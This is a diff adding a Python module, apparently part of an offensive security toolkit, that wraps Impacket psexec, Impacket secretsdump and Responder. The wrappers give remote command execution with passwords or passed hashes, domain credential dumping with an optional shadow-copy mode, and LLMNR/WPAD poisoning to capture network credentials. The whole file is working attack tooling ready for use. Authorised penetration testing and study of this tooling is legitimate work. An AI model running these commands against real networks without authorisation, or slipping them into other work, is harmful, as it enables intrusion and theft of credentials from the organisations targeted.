@@ -1,0 +1,98 @@
+"""Active Directory & Internal Network Attacks — Impacket and Responder."""
+
+from shadowcypher.core.runner import runner
+from shadowcypher.core.sanitize import validate_target
+from shadowcypher.core.logger import logger
+import os
+
+
+class ADAttacks:
+    @staticmethod
+    def impacket_psexec(
+        target,
+        username,
+        password,
+        domain="",
+        hashes="",
+        on_output=None,
+        on_complete=None,
+    ):
+        if not validate_target(target):
+            if on_output:
+                on_output(f"[ERROR] Invalid target: {target}")
+            return
+
+        cred_str = ""
+        if domain:
+            cred_str += f"{domain}/"
+        cred_str += username
+
+        if password:
+            cred_str += f":{password}"
+
+        cred_str += f"@{target}"
+
+        args = ["impacket-psexec", cred_str]
+        if hashes:
+            args.extend(["-hashes", hashes])
+
+        logger.info("ad", f"Impacket psexec to {target} as {username}")
+        return runner.execute_task(f"PSEXEC_{target}", args, callback=on_output)
+
+    @staticmethod
+    def impacket_secretsdump(
+        target,
+        username,
+        password,
+        domain="",
+        hashes="",
+        use_vss=False,
+        on_output=None,
+        on_complete=None,
+    ):
+        if not validate_target(target):
+            if on_output:
+                on_output(f"[ERROR] Invalid target: {target}")
+            return
+
+        cred_str = ""
+        if domain:
+            cred_str += f"{domain}/"
+        cred_str += username
+
+        if password:
+            cred_str += f":{password}"
+
+        cred_str += f"@{target}"
+
+        args = ["impacket-secretsdump", cred_str]
+        if hashes:
+            args.extend(["-hashes", hashes])
+        if use_vss:
+            args.append("-use-vss")
+
+        logger.info("ad", f"Impacket secretsdump to {target} as {username}")
+        return runner.execute_task(f"SECRETSDUMP_{target}", args, callback=on_output)
+
+    @staticmethod
+    def run_responder(
+        interface, analyze_only=False, wpad=True, on_output=None, on_complete=None
+    ):
+        responder_path = "/opt/Responder/Responder.py"
+
+        if not os.path.exists(responder_path):
+            if on_output:
+                on_output(
+                    f"[ERROR] Responder not found at {responder_path}. Please check installation."
+                )
+            return
+
+        args = ["python3", responder_path, "-I", interface]
+
+        if analyze_only:
+            args.append("-A")
+        if not wpad:
+            args.extend(["-w", "Off"])
+
+        logger.info("ad", f"Running Responder on {interface}")
+        return runner.execute_task(f"RESPONDER_{interface}", args, callback=on_output)
